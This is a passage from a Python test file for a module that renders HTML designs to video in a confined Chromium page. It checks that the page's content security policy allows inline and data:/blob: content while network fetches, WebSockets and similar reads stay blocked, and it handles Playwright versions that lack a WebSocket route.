    job = {"id": "G01", "slug": "G01-test", "html": GRAPHIC_HTML.replace("TEXT", "Hello"), "frames": 4, "fps": 30.0, "rate": "30/1",
           "canvas": graphics.canvas(320, 180), "out": str(tmp_path / "G01-test.mov"), "size": (320, 180)}
    assert graphics._render_one(job)["error"] is None
    chosen = graphics.SANDBOX.on
    assert chosen in (True, False)
    said = capsys.readouterr().err.count("Chromium's sandbox can't start here")
    assert said == (0 if chosen else 1)
    job["id"], job["slug"], job["out"] = "G02", "G02-test", str(tmp_path / "G02-test.mov")
    assert graphics._render_one(job)["error"] is None
    assert graphics.SANDBOX.on is chosen and "sandbox" not in capsys.readouterr().err


def test_the_policy_lets_a_design_that_only_draws_through():
    # what the policy allows, spelled out: inline script and style, and data:/blob: pictures, fonts and media
    allowed = {"script-src": ["'unsafe-inline'"], "style-src": ["'unsafe-inline'"], "img-src": ["data:", "blob:"], "font-src": ["data:", "blob:"], "media-src": ["data:", "blob:"]}
    directives = {d.split()[0]: d.split()[1:] for d in graphics.CSP.split("; ")}
    for name, sources in allowed.items():
        assert all(s in directives[name] for s in sources), name
    # fetch and XHR of a data: or blob: URL reach no network, and a design that decodes its own embedded data with them still works
    assert directives["connect-src"] == ["data:", "blob:"] and directives["default-src"] == ["'none'"]
    assert re.search(r"(?<![\w-])(https?|wss?|\*)(?![\w-])", graphics.CSP) is None  # no network source anywhere in it


# --------------------------------------------------------------- a design that reads its own embedded data still works


READS_ITS_OWN_DATA = (
    "<!doctype html><html><head><style>html,body{margin:0;background:transparent}#p{position:absolute;left:0;top:0;width:100%;height:100%;background:#f00}</style></head>"
    "<body><div id=p></div><script>"
    "let ok = 0;"
    "try { const x = new XMLHttpRequest(); x.open('GET', 'data:text/plain,loaded', false); x.send(); if (x.responseText === 'loaded') ok++; } catch (e) {}"
    "try { const u = URL.createObjectURL(new Blob(['hello'])); const y = new XMLHttpRequest(); y.open('GET', u, false); y.send(); if (y.responseText === 'hello') ok++; } catch (e) {}"
    "window.seek = function (t) { document.getElementById('p').style.background = ok === 2 ? '#0f0' : '#f00'; };</script></body></html>"
)


@needs_renderer
def test_a_design_that_reads_a_data_or_blob_url_with_xhr_is_not_blocked_or_noted(tmp_path):
    """connect-src 'none' refused these too, though neither touches a network, and the note said a `data:` URL was not
    self-contained. A design that decodes data it carries must draw as it did before the policy."""
    job = {"id": "G01", "slug": "G01-test", "html": READS_ITS_OWN_DATA, "frames": 3, "fps": 30.0, "rate": "30/1",
           "canvas": graphics.canvas(320, 180), "out": str(tmp_path / "G01-test.mov"), "size": (320, 180)}
    result = graphics._render_one(job)
    assert result["error"] is None
    assert [n for n in result["notes"] if "tried to" in n or "blocked" in n or "error" in n] == []  # (the plate fills the frame: other notes are about that)
    rgb = subprocess.run(["ffmpeg", "-v", "error", "-i", str(tmp_path / "G01-test.mov"), "-frames:v", "1", "-vf", "scale=4:4,format=rgb24", "-f", "rawvideo", "-"],
                         capture_output=True, check=True).stdout
    assert rgb[1] > 200 and rgb[0] < 60 and rgb[2] < 60, rgb[:3]  # green: both reads worked


@needs_renderer
def test_the_same_reads_of_the_network_are_still_refused(listeners):
    names = ["fetch", "xhr", "beacon", "websocket", "eventsource", "worker"]
    found = asyncio.run(hear(listeners, names, POLICY_ONLY))
    assert {n: h for n, h in found.items() if h} == {}


# --------------------------------------------------------------- Playwright old enough to lack the WebSocket route


def test_a_playwright_older_than_the_websocket_route_is_a_renderer_problem(monkeypatch):
    monkeypatch.setattr(graphics, "playwright_version", lambda: (1, 47, 0))
    problem = graphics.renderer_problem()
    assert problem and "1.48" in problem and "1.47" in problem and "pip install" in problem
    monkeypatch.setattr(graphics, "playwright_version", lambda: (1, 48, 0))
    assert graphics.renderer_problem() != problem  # (None where a browser is installed)
    monkeypatch.setattr(graphics, "playwright_version", lambda: None)  # a version that can't be read isn't held against it
    assert graphics.renderer_problem() != problem


def test_the_installed_playwright_version_is_read():
    v = graphics.playwright_version()
    assert v is None or (len(v) == 3 and all(isinstance(n, int) for n in v))


def test_a_context_without_the_websocket_route_is_said_once_and_still_confined(capsys, monkeypatch):
    class Old(_Context):
        route_web_socket = None  # Playwright before 1.48

    class OldBrowser(_Browser):
        async def new_context(self, **options):
            self.calls.append(("new_context", options))
            return Old(self.calls)

    monkeypatch.setattr(graphics, "_SAID", set())
    for _ in range(3):
        browser = OldBrowser()
        asyncio.run(graphics._confined_page(browser, (640, 360, 1.0), []))
        names = [c[0] for c in browser.calls]
        assert "route" in names and "route_web_socket" not in names  # the rest of the layers are all there
    said = capsys.readouterr().err
    assert said.count("no WebSocket route") == 1 and "1.48" in said
